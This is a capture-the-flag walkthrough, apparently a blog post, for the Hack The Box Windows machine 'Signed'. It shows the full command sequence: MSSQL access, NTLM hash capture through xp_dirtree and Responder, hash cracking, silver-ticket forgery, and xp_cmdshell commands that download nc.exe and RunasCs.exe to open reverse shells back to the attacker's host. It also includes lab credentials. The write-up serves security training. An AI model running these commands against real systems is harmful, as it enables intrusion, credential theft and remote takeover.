---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Signed Season 9 Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

***

_Welcome! This write-up walks through the_ **Signed** _season 9 machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

#### About Machine

#### Machine Info

* **Machine Name:** Signed
* **Machine OS:** Windows
* **Difficulty:** Medium
* Machine Link: \[[https://app.hackthebox.com/machines/Signed](https://app.hackthebox.com/machines/Signed)]

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: `scott / Sm230#C5NatH`

> **Note:** In some of the next steps we may get a “Clock skew too great” error. Then run the following command to fix the problem: _`sudo ntpdate <target>`_

> Because Kerberos is very sensitive to time synchronization. If the clock difference between your machine and the target machine is more than 5 minutes, authentication fails. This is a security feature in Kerberos to prevent replay attacks.

#### Initial Scanning:

```bash
nmap -sV -sC -T4 -p- -A 10.10.11.90 -vv -Pn -oN NmapScan.txt


PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-25T11:09:18+00:00; -25m01s from scanner time.
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-25T02:08:44
| Not valid after:  2055-10-25T02:08:44
| MD5:   bfa7:cda9:b08e:4f4f:dec2:c484:d43a:25d6
| SHA-1: ed92:5344:ec89:09b7:ef4e:05ce:c2b7:c214:9341:0d36
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQfqMDkDF3aJdIzRkV72oOjjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMDI1MDIwODQ0WhgPMjA1NTEwMjUwMjA4NDRaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAMFHZ76h
| T0q/2beApA966MjssY6VLo9L3QlcAB8pqgq0RowoVo3LuSntyH/r2j3D+7ERSBd7
| O3qYzNKL8t5NjY811Wi04FfwSyV1QFgJ3xNIt0AdJ2Hu0f0+2BW8oNkhWNYk0F40
| cUyZ5/HWjHcvXqz7t9Y8bTVUWKRTJtbxEaozjHW2fKuFvDudbPvZU0d9x336a7VO
| CziDXSWOa2fdSrqu3Kn8xJki6WQmTGcMI1KfLutsdOGDWNgtWrJKOU3B5VvfIvjA
| 9HngUzNVyaWb8sHZDxfb/4AtxYRdATd3GM9umZaTM0d2XcVIuDc6RS4+b0IOtifM
| J+ioHkRpae0KHWFocGH/qB1VDFeTPTOmTnhNs8rTdl57EjLXdMzd9rUoCqwK4Lpq
| RNTdFBZ68C97GaIqJ4Wy2I/jDQXontrL/cG3PoRdNgUPhOWd+ZffG+7brOU9nvMI
| hFufi0irffwMmMmesY3M9LittN3WOzpkadl2NPym+9duhAlsyl9Y/asbfQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQC+Amgx5mPAGus3sjKYJOhond7eTduKBWMBs4F5
| rhbQq+elckrBPlWC+14SGa0J1xnEpYEMnAS9RC9T3gB+5g6HOyoo33hT9XB+gUZr
| Dmi7gl6p+281YoB8ECkvRIFzU10KGkI4QEhhAsoZ3fvFNFpaKJ3nf6qHeb05D083
| +I4nFwWMWXNbFdcj3oGXvxIjTd+HHZUFe0hwpcPqgEEW8jGNbXLHu/U1gwdGgiEg
| H6cR3g1gNwWFm4yVxxvwaFG52cZ8PeTsEjm9ycXQOgntFB1tZnZ5g5VtOIrl9ufM
| pV2NKRxIjjnUEs/Y5nZbLSCF0itR4cbkNMDeZNmx8FwhKxUb7KJSPH9+Sf7lEobj
| 1bJpW6dszwzWQ9+vIfKxkFgt/KhxcVsRtBBi5f9hyhoX24A8ZBNO8W6dIwKpEits
| sA6YOEiN817V5DnjYJPex2V4RBiY1C2+zFLsK35zWttSJ0d1PWuJc4yyC07aaNgn
| OIIsA1rVrg2wpb3yjbcg06XMGlg=
|_-----END CERTIFICATE-----
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=10/25%OT=1433%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68FCB5BB%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
SEQ(SP=105%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental

Host script results:
|_clock-skew: mean: -25m00s, deviation: 0s, median: -25m01s

TRACEROUTE (using port 1433/tcp)
HOP RTT      ADDRESS
1   72.82 ms 10.10.14.1
2   72.85 ms 10.10.11.90
```

We can see in nmap result :

* Only one port is open — **1433/TCP** running Microsoft SQL Server 2022 RTM (16.00.1000.00).
* Domain Controller: `DC01.SIGNED.HTB`
* The service is secured with a **self-signed certificate** (SSL\_Self\_Signed\_Fallback)

Add `DC01.signed.htb` and `signed.htb` to `/etc/hosts`:

```bash
sudo echo "10.10.11.90 DC01.signed.htb signed.htb" | sudo tee -a /etc/hosts
```

#### Initial Access

```bash
impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.10.11.90
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*tmaGYmhtz2HUHZsGkbXWFg.png" alt=""><figcaption></figcaption></figure>

We try to enable `xp_cmdshell` but it is showing Access Denied.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Ui7pf2ygBZqUmb4ui_Qcgw.png" alt=""><figcaption></figcaption></figure>

We check `xp_dirtree` and we see that it is returns 1 (has EXECUTE permission).

<figure><img src="https://cdn-images-1.medium.com/max/800/1*uPfFM0H_De2lmQx0a1SF-g.png" alt=""><figcaption></figcaption></figure>

`xp_dirtree` is often overlooked; it interacts with SMB when passed a UNC path, prompting NTLM authentication.

#### NTLM Hash Capture via SMB Relay

At first we start responder to capture NTLM hashes:

```bash
sudo responder -I tun0 -v
```

Then run this in SQL server:

```bash
xp_dirtree \\10.10.14.172\smbshare
```

And we capture this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*HN4ujj9pJuWNFHGOH3_R4A.png" alt=""><figcaption></figcaption></figure>

Now copy the hash in a file and crack the hash using john:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*9QmsIg2wlzt5AUK99Z19wA.png" alt=""><figcaption></figcaption></figure>

Now again we use `impacket-mssqlclient` to connect with mssqlsvc:

```bash
impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@'@10.10.11.90 -windows-auth
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*t1DVikSw_v_O1rTcq_F1qA.png" alt=""><figcaption></figcaption></figure>

Now we try to enumerate sysadmin role members:

```bash
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
```

IT group (SIGNED\IT) Has sysadmin role. If we can impersonate this, we get full control.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*fPZbSovJqEeEUR_fXAuSyw.png" alt=""><figcaption></figcaption></figure>

#### Kerberos Silver Ticket Forgery

We perform SID enumeration via SQL:

```bash
SELECT DEFAULT_DOMAIN() AS mydomain;
SELECT master.sys.fn_varbintohexstr(SUSER_SID('SIGNED\IT'));
SELECT master.sys.fn_varbintohexstr(SUSER_SID('SIGNED\mssqlsvc'));
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*1wicMHl6SiOOFnxdU31kwg.png" alt=""><figcaption></figcaption></figure>

We use this python script to convert Binary hex SID to human readable SID format:

```python
# HexToSIDConverter.py
def hex_to_sid(h):
    # sanitize input: strip 0x prefix, spaces, newlines
    h = h.strip().lower()
    if h.startswith("0x"):
        h = h[2:]
    h = "".join(h.split())   # remove internal whitespace if any

    b = bytes.fromhex(h)
    rev = b[0]
    cnt = b[1]
    id_auth = int.from_bytes(b[2:8], 'big')
    subs = [int.from_bytes(b[8+4*i:12+4*i], 'little') for i in range(cnt)]
    sid = "S-{}-{}".format(rev, id_auth) + ''.join("-{}".format(s) for s in subs)
    return sid

if __name__ == "__main__":
    # example values you posted
    examples = [
        "0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000",
        "0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
    ]
    for h in examples:
        print(h, "->", hex_to_sid(h))
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*AIGj681xeK5rUyk_PoZbkQ.png" alt=""><figcaption></figcaption></figure>

**Compute NTLM Hash**

```bash
iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*DCgdTtYND7Z59HZTP-Cwrg.png" alt=""><figcaption></figcaption></figure>

#### Forging and Using a Silver Ticket

```bash
impacket-ticketer -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -spn 'MSSQLSvc/DC01.signed.htb:1433' -groups 1105 -user-id 500 Administrator
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*kZOpxPYWrWkpG4lo2sbLmg.png" alt=""><figcaption></figcaption></figure>

Now export the ticket:

```bash
export KRB5CCNAME=Administrator.ccache
```

And Now try to connect:

```bash
impacket-mssqlclient -k -no-pass DC01.signed.htb
```

But it can give error:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*5bnhRbcChlZOZNIYGCL0cA.png" alt=""><figcaption></figcaption></figure>

**Try to Troubleshooting Kerberos Authentication:**

* Disable NTP and sync manually:

```bash
sudo timedatectl set-ntp 0
timedatectl status
```

* Sync with the Domain Controller if possible:

```bash
sudo ntpdate -u 10.10.11.90
```

* Set manual time:

```bash
sudo date -s "2025-10-26 15:29:01"
date
```

* Use faketime:

```bash
 faketime '2025-10-26 23:19:36' impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

After trying multiple time finally we got this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*JNALbtX84MqbDm_C_8o8NA.png" alt=""><figcaption></figcaption></figure>

Now we try to enable `xp_cmdshell:`

<figure><img src="https://cdn-images-1.medium.com/max/800/1*wQ2V44-29bj0qqW9NqGtcA.png" alt=""><figcaption></figcaption></figure>

Now try to execute command to get reverse shell. We use [nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc.exe) to get reverse shell.

Run the python server to share the payload:

```bash
python3 -m http.server
```

Now go to SQL terminal and run the following command to download the payload to remote machine:

```bash
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.172:80/nc.exe -OutFile %temp%/nc.exe"
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*hrqf2u-_laIBf6pJi_l5dQ.png" alt=""><figcaption></figcaption></figure>

Run Netcat Listener on local machine:

```bash
rlwrap -cAr nc -lnvp 4848
```

Now execute the payload by using this command:

```bash
xp_cmdshell "%temp%\\nc.exe -e cmd.exe 10.10.14.172 4848"
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*ChHy7Q0XegammIwmB_M-hg.png" alt=""><figcaption></figcaption></figure>

And we get user flag:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*pcjCMY-LxdxcjI8UBdzEuQ.png" alt=""><figcaption></figcaption></figure>

#### Privilege Escalation

**Again Forging and Using a Silver Ticket:**

```bash
impacket-ticketer -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105,512,519 -user-id 1103 mssqlsvc
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*z-ycslai7UhJw-S7WSbeFw.png" alt=""><figcaption></figcaption></figure>

Now export the ticket:

```bash
export KRB5CCNAME=mssqlsvc.ccache
```

Again we use faketime to connect with mssql:

```bash
faketime '2025-10-27 01:07:48' impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*0LMw9XEW043pve1iLwqdLQ.png" alt=""><figcaption></figcaption></figure>

Now we try to read PowerShell history. PowerShell maintains a command history file for each user, read the file:

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS x;
```

And we see huge amount of data and credentials. After many analysis with the output we found Administrator Credential:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*7UB--ct8FltUM8dMQLL7nQ.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*ljrf_ir3hevaOUw1FXVqog.png" alt=""><figcaption></figcaption></figure>

#### Final Privilege Escalation

Here we use RunasCs.exe **to get reverse shell. Upload RunasCs.exe:**

```bash
enable_xp_cmdshell
EXEC xp_cmdshell 'powershell -NoP -NonI -C "Invoke-WebRequest -Uri http://10.10.14.172:80/RunasCs.exe -OutFile C:\Users\mssqlsvc\Desktop\RunasCs.exe -UseBasicParsing"'
```

Run Netcat Listener on local machine:

```bash
rlwrap -cAr nc -lnvp 443
```

**Exploit RunasCs:**

```bash
EXEC xp_cmdshell 'C:\Users\mssqlsvc\Desktop\RunasCs.exe Administrator Th1s889Rabb!t cmd.exe -r 10.10.14.172:443'
```

And we get reverse shell connection:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*JYw6r4JYbH38IojJ3-ZnWg.png" alt=""><figcaption></figcaption></figure>

And also get Root Flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*49guLYz9vsN3Nrb9NvZuVg.png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
